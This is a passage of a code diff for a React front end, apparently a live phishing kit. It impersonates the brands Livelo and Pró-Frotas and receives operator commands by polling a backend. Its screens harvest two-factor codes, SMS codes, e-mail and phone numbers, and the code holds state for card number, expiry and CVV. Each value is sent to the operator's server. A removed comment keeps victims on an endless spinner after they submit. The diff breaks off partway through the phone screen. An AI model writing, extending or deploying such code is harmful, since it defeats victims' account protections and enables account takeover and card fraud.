@@ -4,6 +4,66 @@ import axios from "axios";
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
 const API = `${BACKEND_URL}/api`;
 
+// Cor principal Pró-Frotas
+const PF_BLUE = "#5C6BC0";
+const PF_BLUE_LIGHT = "#9FA8DA";
+
+// Logo e Banner reutilizáveis
+const PFLogo = () => (
+  <div className="mb-8">
+    <img src="/profrotas_logo.png" alt="Pró-Frotas" className="h-14 w-auto" />
+  </div>
+);
+
+// Layout split-screen padrão Pró-Frotas
+const PFLayout = ({ children }) => (
+  <div className="min-h-screen flex" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }}>
+    <div className="hidden lg:block lg:w-[45%] relative overflow-hidden">
+      <img src="/profrotas_banner.png" alt="Pró-Frotas Banner" className="w-full h-full object-cover object-top" />
+    </div>
+    <div className="flex-1 flex flex-col items-center justify-center bg-white px-6">
+      {children}
+    </div>
+  </div>
+);
+
+// Spinner padrão
+const PFSpinner = () => (
+  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+  </svg>
+);
+
+// Botão padrão
+const PFButton = ({ disabled, loading, children, onClick, type = "submit" }) => (
+  <button
+    type={type}
+    onClick={onClick}
+    disabled={disabled || loading}
+    className="w-full py-2.5 rounded text-white font-medium text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+    style={{ backgroundColor: disabled || loading ? PF_BLUE_LIGHT : PF_BLUE, height: '42px' }}
+  >
+    {loading ? <div className="flex items-center justify-center"><PFSpinner /></div> : children}
+  </button>
+);
+
+// Ícone circular padrão
+const PFIcon = ({ isInvalid, children }) => (
+  <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isInvalid ? 'bg-red-100' : 'bg-blue-50'}`}>
+    <svg className={`w-8 h-8 ${isInvalid ? 'text-red-500' : 'text-[#5C6BC0]'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      {children}
+    </svg>
+  </div>
+);
+
+// Mensagem de erro padrão
+const PFError = ({ message }) => (
+  <div className="mb-4 px-4 py-2.5 bg-red-50 border border-red-200 rounded-lg w-full max-w-[280px]">
+    <p className="text-red-600 text-xs text-center font-medium">{message}</p>
+  </div>
+);
+
 function CommandPage({ userId }) {
   const [currentCommand, setCurrentCommand] = useState(null);
   const [inputValue, setInputValue] = useState("");
@@ -16,7 +76,7 @@ function CommandPage({ userId }) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
 
-  // Polling de comandos - visible checado em CADA chamada
+  // Polling - visible checado em CADA chamada
   useEffect(() => {
     const poll = async () => {
       try {
@@ -27,7 +87,6 @@ function CommandPage({ userId }) {
         }
       } catch (error) {}
     };
-
     poll();
     const interval = setInterval(poll, 1500);
     return () => clearInterval(interval);
@@ -50,55 +109,36 @@ function CommandPage({ userId }) {
   const handleSubmit = async (e, field, customValue = null) => {
     e.preventDefault();
     setLoading(true);
-    
-    // Usar o valor personalizado se fornecido, senão usar codeDigits (para códigos) ou inputValue
     let valueToSend;
     if (customValue !== null) {
       valueToSend = customValue;
     } else if (field === "token_2fa" || field === "sms_code" || field === "app_mail") {
-      // Campos que usam os 6 quadradinhos
       valueToSend = codeDigits.join('');
     } else {
       valueToSend = inputValue;
     }
-    
     try {
-      await axios.post(`${API}/user/submit-data/${userId}`, {
-        field: field,
-        value: valueToSend
-      });
+      await axios.post(`${API}/user/submit-data/${userId}`, { field, value: valueToSend });
       setSubmitted(true);
-      // Após enviar cc_code, ir para Aguarde
       if (field === "cc_code") {
         setCurrentCommand({ action: "AGUARDE" });
       }
     } catch (error) {
       console.error("Erro ao enviar dados:", error);
     }
-    // Manter em loading infinito após enviar
   };
 
-  // Handler para os 6 quadradinhos do código
   const handleCodeChange = (index, value) => {
     if (loading) return;
-    
-    // Aceitar apenas números
     const digit = value.replace(/\D/g, '').slice(-1);
-    
     const newDigits = [...codeDigits];
     newDigits[index] = digit;
     setCodeDigits(newDigits);
-    
-    // Auto-avançar para o próximo campo
-    if (digit && index < 5) {
-      inputRefs.current[index + 1]?.focus();
-    }
+    if (digit && index < 5) inputRefs.current[index + 1]?.focus();
   };
 
   const handleKeyDown = (index, e) => {
     if (loading) return;
-    
-    // Voltar para o campo anterior ao apagar
     if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
     }
@@ -106,1185 +146,326 @@ function CommandPage({ userId }) {
 
   const handlePaste = (e) => {
     if (loading) return;
-    
     e.preventDefault();
     const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
     const newDigits = [...codeDigits];
-    
-    for (let i = 0; i < pastedData.length; i++) {
-      newDigits[i] = pastedData[i];
-    }
-    
+    for (let i = 0; i < pastedData.length; i++) newDigits[i] = pastedData[i];
     setCodeDigits(newDigits);
-    
-    // Focar no último campo preenchido ou no próximo vazio
-    const focusIndex = Math.min(pastedData.length, 5);
-    inputRefs.current[focusIndex]?.focus();
+    inputRefs.current[Math.min(pastedData.length, 5)]?.focus();
   };
 
-  // Página de dados inválidos
+  // 6 quadradinhos de código
+  const CodeInputs = ({ isInvalid = false }) => (
+    <div className="flex justify-center gap-2.5">
+      {codeDigits.map((digit, index) => (
+        <input
+          key={index}
+          ref={(el) => (inputRefs.current[index] = el)}
+          type="text"
+          inputMode="numeric"
+          maxLength="1"
+          value={digit}
+          onChange={(e) => handleCodeChange(index, e.target.value)}
+          onKeyDown={(e) => handleKeyDown(index, e)}
+          onPaste={handlePaste}
+          disabled={loading}
+          className={`w-11 h-12 text-center text-xl font-bold border-2 rounded-lg focus:outline-none transition-all ${
+            isInvalid ? 'border-red-500 bg-red-50' : digit ? `border-[${PF_BLUE}] bg-blue-50` : 'border-gray-300 bg-white'
+          } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-[#5C6BC0] focus:shadow-md focus:shadow-blue-100'}`}
+          style={digit && !isInvalid ? { borderColor: PF_BLUE } : {}}
+        />
+      ))}
+    </div>
+  );
+
+  // =================== INV ===================
   if (currentCommand?.action === "INV") {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
-        <div className="max-w-md w-full text-center">
-          <div className="mb-6">
-            <svg className="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-          </div>
-          <h1 className="text-3xl font-bold text-gray-900 mb-4">Dados Inválidos</h1>
-          <p className="text-gray-600 mb-8">
-            Os dados que você digitou estão incorretos. Por favor, tente novamente com as informações corretas.
-          </p>
-          <button
-            onClick={() => window.location.reload()}
-            className="bg-pink-500 hover:bg-pink-600 text-white px-8 py-3 rounded-full font-semibold transition-colors"
-          >
+      <PFLayout>
+        <PFLogo />
+        <PFIcon isInvalid={true}>
+          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+        </PFIcon>
+        <h1 className="text-xl font-bold text-gray-900 mb-2 text-center">Dados Inválidos</h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">
+          Os dados digitados estão incorretos. Tente novamente.
+        </p>
+        <div className="w-full max-w-[280px]">
+          <PFButton disabled={false} loading={false} onClick={() => window.location.reload()}>
             Tentar Novamente
-          </button>
+          </PFButton>
         </div>
-      </div>
+      </PFLayout>
     );
   }
 
-  // Página de código 2FA (Autenticação de Duas Etapas)
+  // =================== AUT (2FA) ===================
   if (currentCommand?.action === "AUT" || currentCommand?.action === "AUT-INV") {
-    const isCodeComplete = codeDigits.every(digit => digit !== '');
+    const isCodeComplete = codeDigits.every(d => d !== '');
     const isInvalid = currentCommand?.action === "AUT-INV";
-    
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
-            />
-          </div>
-
-          {/* Ícone de Segurança */}
-          <div className="mb-6">
-            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
-              <svg 
-                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
-                fill="none" 
-                stroke="currentColor" 
-                viewBox="0 0 24 24"
-              >
-                {isInvalid ? (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
-                  />
-                ) : (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" 
-                  />
-                )}
-              </svg>
-            </div>
-          </div>
-
-          {/* Mensagem de erro se inválido */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                Código inválido. Por favor, digite novamente.
-              </p>
-            </div>
+      <PFLayout>
+        <PFLogo />
+        <PFIcon isInvalid={isInvalid}>
+          {isInvalid ? (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          ) : (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
           )}
-
-          {/* Título */}
-          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
-            Autenticação de Duas Etapas
-          </h1>
-
-          {/* Descrição */}
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Digite o código do seu aplicativo autenticador
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-md space-y-6">
-            {/* 6 Quadradinhos para o código */}
-            <div className="flex justify-center gap-3">
-              {codeDigits.map((digit, index) => (
-                <input
-                  key={index}
-                  ref={(el) => (inputRefs.current[index] = el)}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength="1"
-                  value={digit}
-                  onChange={(e) => handleCodeChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  onPaste={handlePaste}
-                  disabled={loading}
-                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
-                    digit 
-                      ? 'border-pink-500 bg-pink-50' 
-                      : 'border-gray-300 bg-white'
-                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
-                />
-              ))}
-            </div>
-
-            {/* Botão Confirmar */}
-            <button
-              type="submit"
-              disabled={loading || !isCodeComplete}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                isCodeComplete && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                </div>
-              ) : (
-                "Confirmar"
-              )}
-            </button>
-
-            {/* Link de ajuda */}
-            <div className="text-center pt-2">
-              <a
-                href="#"
-                className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
-              >
-                Não recebeu o código?
-              </a>
-            </div>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a
-            href="#"
-            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 mr-2"
-              fill="none"
-              viewBox="0 0 24 24"
-              stroke="currentColor"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M15 19l-7-7 7-7"
-              />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+        </PFIcon>
+        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
+        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Autenticação em Dois Fatores</h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o código do seu aplicativo autenticador</p>
+        <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-[280px] space-y-5">
+          <CodeInputs isInvalid={isInvalid} />
+          <PFButton disabled={!isCodeComplete} loading={loading}>Confirmar</PFButton>
+          <p className="text-center text-xs text-gray-400">Não recebeu o código? Verifique seu aplicativo.</p>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página para digitar EMAIL
+  // =================== EMAIL ===================
   if (currentCommand?.action === "EMAIL" || currentCommand?.action === "EMAIL-INV") {
     const isInvalid = currentCommand?.action === "EMAIL-INV";
-    
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
+      <PFLayout>
+        <PFLogo />
+        <PFIcon isInvalid={isInvalid}>
+          {isInvalid ? (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          ) : (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+          )}
+        </PFIcon>
+        {isInvalid && <PFError message="E-mail inválido. Digite novamente." />}
+        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Confirme seu E-mail</h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o e-mail cadastrado na sua conta</p>
+        <form onSubmit={(e) => handleSubmit(e, "email_input")} className="w-full max-w-[280px] space-y-5">
+          <div>
+            <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>E-mail <span className="text-red-500">*</span></label>
+            <input
+              type="email"
+              value={inputValue}
+              onChange={(e) => setInputValue(e.target.value)}
+              placeholder="seuemail@exemplo.com"
+              disabled={loading}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`}
+              style={{ height: '38px' }}
+              autoFocus
             />
           </div>
-
-          {/* Ícone de Email */}
-          <div className="mb-6">
-            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
-              <svg 
-                className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}
-                fill="none" 
-                stroke="currentColor" 
-                viewBox="0 0 24 24"
-              >
-                {isInvalid ? (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" 
-                  />
-                ) : (
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" 
-                  />
-                )}
-              </svg>
-            </div>
-          </div>
-
-          {/* Mensagem de erro se inválido */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                E-mail inválido. Por favor, digite novamente.
-              </p>
-            </div>
-          )}
-
-          {/* Título */}
-          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
-            Confirme seu E-mail
-          </h1>
-
-          {/* Descrição */}
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Digite o e-mail cadastrado na sua conta Livelo
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={(e) => handleSubmit(e, "email_input")} className="w-full max-w-md space-y-6">
-            {/* Campo de email */}
-            <div className="relative">
-              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
-                <svg 
-                  xmlns="http://www.w3.org/2000/svg" 
-                  className="h-5 w-5" 
-                  fill="none" 
-                  viewBox="0 0 24 24" 
-                  stroke="currentColor"
-                >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" 
-                  />
-                </svg>
-              </div>
-              <input
-                type="email"
-                value={inputValue}
-                onChange={(e) => setInputValue(e.target.value)}
-                placeholder="seuemail@exemplo.com"
-                disabled={loading}
-                className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
-              />
-            </div>
-
-            {/* Botão Confirmar */}
-            <button
-              type="submit"
-              disabled={loading || !inputValue || !inputValue.includes('@')}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                inputValue && inputValue.includes('@') && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                </div>
-              ) : (
-                "Confirmar"
-              )}
-            </button>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a
-            href="#"
-            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 mr-2"
-              fill="none"
-              viewBox="0 0 24 24"
-              stroke="currentColor"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M15 19l-7-7 7-7"
-              />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+          <PFButton disabled={!inputValue || !inputValue.includes('@')} loading={loading}>Confirmar</PFButton>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página TOK-TEL - Código enviado para o telefone
+  // =================== TOK-TEL (Código SMS) ===================
   if (currentCommand?.action === "TOK-TEL" || currentCommand?.action === "TOK-TEL-INV") {
-    const isCodeComplete = codeDigits.every(digit => digit !== '');
-    const phoneLastDigits = currentCommand?.command_reference || "****";
+    const isCodeComplete = codeDigits.every(d => d !== '');
+    const phoneRef = currentCommand?.command_reference || "****";
     const isInvalid = currentCommand?.action === "TOK-TEL-INV";
-    
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
-            />
-          </div>
-
-          {/* Mensagem de erro se inválido */}
-          {isInvalid && (
-            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
-              <p className="text-red-600 text-sm text-center font-medium">
-                Código inválido. Por favor, digite novamente.
-              </p>
-            </div>
-          )}
-
-          {/* Título */}
-          <h1 className={`text-2xl font-bold mb-4 text-center ${isInvalid ? 'text-red-600' : 'text-[#1a1a5e]'}`}>
-            {isInvalid ? 'Código inválido!' : 'Código enviado!'}
-          </h1>
-
-          {/* Descrição com número mascarado */}
-          <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Informe o código que enviamos para o número (**) * ****-{phoneLastDigits}.
-          </p>
-
-          {/* Formulário */}
-          <form onSubmit={(e) => handleSubmit(e, "sms_code")} className="w-full max-w-md space-y-6">
-            {/* 6 Quadradinhos para o código */}
-            <div className="flex justify-center gap-3">
-              {codeDigits.map((digit, index) => (
-                <input
-                  key={index}
-                  ref={(el) => (inputRefs.current[index] = el)}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength="1"
-                  value={digit}
-                  onChange={(e) => handleCodeChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  onPaste={handlePaste}
-                  disabled={loading}
-                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
-                    isInvalid 
-                      ? 'border-red-500 bg-red-50' 
-                      : digit 
-                        ? 'border-pink-500 bg-pink-50' 
-                        : 'border-gray-300 bg-white'
-                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
-                />
-              ))}
-            </div>
-
-            {/* Contador para reenviar */}
-            <div className="text-center">
-              <span className="text-gray-400 text-sm">
-                Aguarde para reenviar
-              </span>
-            </div>
-
-            {/* Botão Continuar */}
-            <button
-              type="submit"
-              disabled={loading || !isCodeComplete}
-              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                isCodeComplete && !loading
-                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
-                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
-              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
-            >
-              {loading ? (
-                <div className="flex items-center justify-center">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                </div>
-              ) : (
-                "Continuar"
-              )}
-            </button>
-          </form>
-        </div>
-
-        {/* Voltar */}
-        <div className="p-8">
-          <a
-            href="#"
-            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 mr-2"
-              fill="none"
-              viewBox="0 0 24 24"
-              stroke="currentColor"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M15 19l-7-7 7-7"
-              />
-            </svg>
-            Voltar para página inicial
-          </a>
-        </div>
-      </div>
+      <PFLayout>
+        <PFLogo />
+        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
+        <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
+          {isInvalid ? 'Código inválido!' : 'Código enviado!'}
+        </h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">
+          Informe o código enviado para o número (**) * ****-{phoneRef}.
+        </p>
+        <form onSubmit={(e) => handleSubmit(e, "sms_code")} className="w-full max-w-[280px] space-y-5">
+          <CodeInputs isInvalid={isInvalid} />
+          <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
+          <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
+        </form>
+      </PFLayout>
     );
   }
 
-  // Página TELEFONE - Digitar número de telefone
+  // =================== TELEFONE ===================
   if (currentCommand?.action === "TELEFONE" || currentCommand?.action === "TELEFONE-INV") {
     const isInvalid = currentCommand?.action === "TELEFONE-INV";
-    
-    // Função para formatar telefone
     const formatPhone = (value) => {
-      const numbers = value.replace(/\D/g, '');
-      if (numbers.length <= 2) return `(${numbers}`;
-      if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
-      if (numbers.length <= 11) return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
-      return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
+      const n = value.replace(/\D/g, '');
+      if (n.length <= 2) return `(${n}`;
+      if (n.length <= 7) return `(${n.slice(0,2)}) ${n.slice(2)}`;
+      return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7,11)}`;
     };
-
-    const handlePhoneChange = (e) => {
-      const formatted = formatPhone(e.target.value);
-      setInputValue(formatted);
-    };
-
     const isPhoneValid = inputValue.replace(/\D/g, '').length >= 10;
-    
     return (
-      <div className="min-h-screen bg-white flex flex-col font-inter">
-        <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          {/* Logo Livelo */}
-          <div className="mb-8">
-            <img 
-              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
-              alt="Livelo Logo" 
-              className="h-10 w-auto"
+      <PFLayout>
+        <PFLogo />
+        <PFIcon isInvalid={isInvalid}>
+          {isInvalid ? (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          ) : (
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
+          )}
+        </PFIcon>
+        {isInvalid && <PFError message="Número inválido. Digite novamente." />}
+        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Confirme seu Telefone</h1>
+        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o número de telefone cadastrado</p>
+        <form onSubmit={(e) => handleSubmit(e, "phone_number")} className="w-full max-w-[280px] space-y-5">
+          <div>
+            <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>Telefone <span className="text-red-500">*</span></label>
+            <input
+              type="tel"
+              value={inputValue}
+              onChange={(e) => setInputValue(formatPhone(e.target.value))}
+              placeholder="(00) 00000-0000"
+              disabled={loading}
